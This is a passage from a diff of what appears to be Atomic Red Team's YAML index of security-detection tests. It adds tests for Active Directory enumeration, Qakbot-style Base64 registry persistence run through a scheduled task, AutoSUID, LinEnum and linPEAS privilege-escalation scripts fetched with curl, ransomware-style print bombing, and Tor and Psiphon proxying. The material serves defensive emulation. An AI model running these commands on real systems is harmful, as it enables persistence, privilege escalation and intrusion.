           nmap -sS #{network_range} -p #{port}
           telnet #{host} #{port}
           nc -nv #{host} #{port}
         name: sh
+        elevation_required: true
     - name: Port Scan NMap for Windows
       auto_generated_guid: d696a3cb-d7a8-4976-8eb5-5af4abf2e3df
       description: Scan ports to check for listening ports for the local host 127.0.0.1
@@ -55356,8 +56335,8 @@ discovery:
         package_installer:
           description: Package installer command. Debian - apt install samba
           type: String
-          default: "(which yum && yum -y epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive
-            apt-get install -y samba)"
+          default: "(which yum && yum -y install epel-release samba)||(which apt-get
+            && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
       dependency_executor_name: bash
       dependencies:
       - description: 'Package with smbstatus (samba) must exist on device
@@ -55541,7 +56520,7 @@ discovery:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: |
@@ -55571,7 +56550,7 @@ discovery:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
@@ -56447,6 +57426,34 @@ discovery:
 
 '
         name: sh
+    - name: Enumerate domain computers within Active Directory using DirectorySearcher
+      auto_generated_guid: 962a6017-1c09-45a6-880b-adc9c57cb22e
+      description: "This test is a Powershell script that enumerates Active Directory
+        to determine computers that are joined to the domain. \nThis test is designed
+        to mimic how SessionGopher can determine the additional systems within a domain,
+        which has been used before by threat actors to aid in lateral movement. \nReference:
+        [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks).
+        \nUpon successful execution, this test will output the names of the computers
+        that reside on the domain to the console window. \n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: This PC must be joined to a domain.
+        prereq_command: "if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain
+          -eq $true) {exit 0} else {exit 1}\t\t"
+        get_prereq_command: 'write-host "This PC must be manually added to a domain." '
+      executor:
+        command: |
+          $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
+          $DirectorySearcher.PropertiesToLoad.Add("Name")
+          $Computers = $DirectorySearcher.findall()
+          foreach ($Computer in $Computers) {
+            $Computer = $Computer.Properties.name
+            if (!$Computer) { Continue }
+            Write-Host $Computer}
+        name: powershell
+        elevation_required: false
   T1518.001:
     technique:
       id: attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384
@@ -64171,7 +65178,7 @@ execution:
         script_url:
           description: Shell script public URL
           type: String
-          default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+          default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
         payload_file_name:
           description: Name of shell script downloaded from the script_url
           type: String
@@ -64216,7 +65223,7 @@ execution:
         script_url:
           description: Shell script public URL
           type: String
-          default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+          default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
         payload_file_name:
           description: Shell script file name downloaded from the script_url
           type: String
@@ -64273,7 +65280,7 @@ execution:
         script_url:
           description: URL hosting external malicious payload
           type: String
-          default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+          default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
         payload_file_name:
           description: Shell script file name downloaded from the script_url
           type: String
@@ -64553,6 +65560,28 @@ execution:
           >$null 2>&1
 
 '
+    - name: Scheduled Task Executing Base64 Encoded Commands From Registry
+      auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba
+      description: "A Base64 Encoded command will be stored in the registry (ping
+        127.0.0.1) and then a scheduled task will be created.\nThe scheduled task
+        will launch powershell to decode and run the command in the rgistry daily.\nThis
+        is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona
+        Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        time:
+          description: Daily scheduled task execution time
+          type: string
+          default: 27900
+      executor:
+        command: |
+          reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
+          schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
+        cleanup_command: |
+          schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
+          reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
+        name: command_prompt
   T1053:
     technique:
       id: attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9
@@ -65334,6 +66363,73 @@ execution:
 
 '
         name: sh
+    - name: Harvest SUID executable files
+      auto_generated_guid: 46274fc6-08a7-4956-861b-24cbbaa0503c
+      description: "AutoSUID application is the Open-Source project, the main idea
+        of which is to automate harvesting the SUID executable files and to find a
+        way for further escalating the privileges. \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        autosuid:
+          description: Path to the autosuid shell script
+          type: Path
+          default: PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
+        autosuid_url:
+          description: Path to download autosuid shell script
+          type: Url
+          default: https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'AutoSUID must exist on disk at specified location (#{autosuid})
+
+'
+        prereq_command: 'if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'curl #{autosuid_url} --output #{autosuid}
+
+'
+      executor:
+        command: |
+          chmod +x #{autosuid}
+          bash #{autosuid}
+        name: sh
+    - name: LinEnum tool execution
+      auto_generated_guid: a2b35a63-9df1-4806-9a4d-5fe0500845f2
+      description: 'LinEnum is a bash script that performs discovery commands for
+        accounts,processes, kernel version, applications, services, and uses the information
+        from these commands to present operator with ways of escalating privileges
+        or further exploitation of targeted host.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        linenum:
+          description: Path to the LinEnum shell script
+          type: Path
+          default: PathToAtomicsFolder/T1059.004/src/LinEnum.sh
+        linenum_url:
+          description: Path to download LinEnum shell script
+          type: Url
+          default: https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'LinnEnum must exist on disk at specified location (#{linenum})
+
+'
+        prereq_command: 'if [ -f #{linenum} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'curl #{linenum_url} --output #{linenum}
+
+'
+      executor:
+        command: |
+          chmod +x #{linenum}
+          bash #{linenum}
+        name: sh
   T1204:
     technique:
       object_marking_refs:
@@ -65466,14 +66562,11 @@ execution:
       - description: Sample script must exist on disk at specified location (#{vbscript})
         prereq_command: 'if (Test-Path #{vbscript}) {exit 0} else {exit 1} '
         get_prereq_command: |-
-          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "$env:TEMP\sys_info.vbs"
           New-Item -ItemType Directory (Split-Path #{vbscript}) -Force | Out-Null
-          Copy-Item $env:TEMP\sys_info.vbs #{vbscript} -Force
+          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "#{vbscript}"
       executor:
         command: 'cscript #{vbscript} > $env:TEMP\T1059.005.out.txt'
-        cleanup_command: |-
-          Remove-Item $env:TEMP\sys_info.vbs -ErrorAction Ignore
-          Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
+        cleanup_command: Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
         name: powershell
     - name: Encoded VBS code execution
       auto_generated_guid: e8209d5f-e42d-45e6-9c2f-633ac4f1eefa
@@ -65676,6 +66769,45 @@ execution:
         command: "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file}
           & type #{output_file}\n"
         name: command_prompt
+    - name: Simulate BlackByte Ransomware Print Bombing
+      auto_generated_guid: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
+      description: "This test attempts to open a file a specified number of times
+        in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte
+        ransomware's print bombing technique, where tree.dll, which contains the ransom
+        note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/.
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_to_print:
+          description: File to be opened/printed by Wordpad.
+          type: String
+          default: "$env:temp\\T1059_003note.txt"
+        max_to_print:
+          description: The maximum number of Wordpad windows the test will open/print.
+          type: String
+          default: 75
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'File to print must exist on disk at specified location (#{file_to_print})
+
+'
+        prereq_command: 'if (test-path "#{file_to_print}"){exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'new-item #{file_to_print} -value "This file has been
+          created by T1059.003 Test 4" -Force | Out-Null
+
+'
+      executor:
+        command: 'cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe
+          /p #{file_to_print}" | out-null
+
+'
+        cleanup_command: 'stop-process -name wordpad -force -erroraction silentlycontinue
+
+'
+        name: powershell
   T1047:
     technique:
       id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
@@ -70015,7 +71147,131 @@ command-and-control:
       - macOS
       - Windows
       - Network
-    atomic_tests: []
+      identifier: T1090.003
+    atomic_tests:
+    - name: Psiphon
+      auto_generated_guid: 14d55ca0-920e-4b44-8425-37eedd72b173
+      description: |
+        Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you
+        with uncensored access to Internet.
+        This process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.
+        More information can be found about Psiphon using the following urls
+        http://s3.amazonaws.com/0ubz-2q11-gi9y/en.html
+        https://psiphon.ca/faq.html
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The proxy settings backup file must exist on disk at $env:Temp\proxy-backup.txt
+
+'
+        prereq_command: 'if (Test-Path $env:Temp\proxy-backup.txt) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: |
+          if(-not (test-path $env:Temp\proxy-backup.txt)){
+          $Proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name "ProxyServer" -ErrorAction Ignore).ProxyServer
+          Set-Content $env:Temp\proxy-backup.txt $Proxy}
+      - description: 'The Psiphon executable must exist in the Downloads folder
+
+'
+        prereq_command: 'if (Test-Path $env:UserProfile\Downloads\psiphon3.exe) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -OutFile "$env:UserProfile\Downloads\psiphon3.exe"
+          "https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe"
+
+'
+      executor:
+        name: powershell
+        command: 'PathToAtomicsFolder\T1090.003\src\Psiphon.bat
+
+'
+        cleanup_command: "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction
+          Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet
+          Settings' -Name \"ProxyServer\" -Value $Proxy}\n"
+    - name: Tor Proxy Usage - Windows
+      auto_generated_guid: 7b9d85e5-c4ce-4434-8060-d3de83595e69
+      description: "This test is designed to launch the tor proxy service, which is
+        what is utilized in the background by the Tor Browser and other applications
+        with add-ons in order to provide onion routing functionality.\nUpon successful
+        execution, the tor proxy will be launched, run for 60 seconds, and then exit.
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        TorExe:
+          description: Location of tor.exe file.
+          type: String
+          default: "$env:temp\\tor\\Tor\\tor.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "tor.exe must be installed on the machine \n"
+        prereq_command: 'if (Test-Path #{TorExe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Start-BitsTransfer -Source "https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip" -Destination "$env:temp\tor.zip" -dynamic
+          expand-archive -LiteralPath "$env:temp\tor.zip" -DestinationPath "$env:temp\tor"
+      executor:
+        command: |
+          invoke-expression 'cmd /c start powershell -Command {cmd /c #{TorExe}}'
+          sleep -s 60
+          stop-process -name "tor" | out-null
+        name: powershell
+        elevation_required: false
+    - name: Tor Proxy Usage - Debian/Ubuntu
+      auto_generated_guid: 5ff9d047-6e9c-4357-b39b-5cf89d9b59c7
+      description: "This test is designed to launch the tor proxy service, which is
+        what is utilized in the background by the Tor Browser and other applications
+        with add-ons in order to provide onion routing functionality.\nUpon successful
+        execution, the tor proxy service will be launched. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: "Tor must be installed on the machine \n"
+        prereq_command: 'if [ -x "$(command -v tor --version)" ]; then exit 0; else
+          exit 1; fi
+
+'
+        get_prereq_command: 'sudo apt-get -y install tor
+
+'
+      executor:
+        command: "sudo systemctl start tor \n"
+        cleanup_command: 'sudo systemctl stop tor
+
+'
+        name: sh
+    - name: Tor Proxy Usage - MacOS
+      auto_generated_guid: 12631354-fdbc-4164-92be-402527e748da
+      description: "This test is designed to launch the tor proxy service, which is
+        what is utilized in the background by the Tor Browser and other applications
+        with add-ons in order to provide onion routing functionality.\nUpon successful
+        execution, the tor proxy service will be launched. \n"
+      supported_platforms:
+      - macos
+      dependency_executor_name: sh
+      dependencies:
+      - description: "Tor must be installed on the machine \n"
+        prereq_command: 'if [ -x "$(command -v tor --version)" ]; then exit 0; else
+          exit 1; fi
+
+'
+        get_prereq_command: |
+          if [ ! -x "$(command -v brew --version)" ]; then /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)"; fi
+          brew install tor
+      executor:
+        command: 'osascript -e ''tell application "Terminal" to do script "tor"''
+
+'
+        cleanup_command: 'killall tor > /dev/null 2>&1
+
+'
+        name: sh
   T1026:
     technique:
       id: attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091
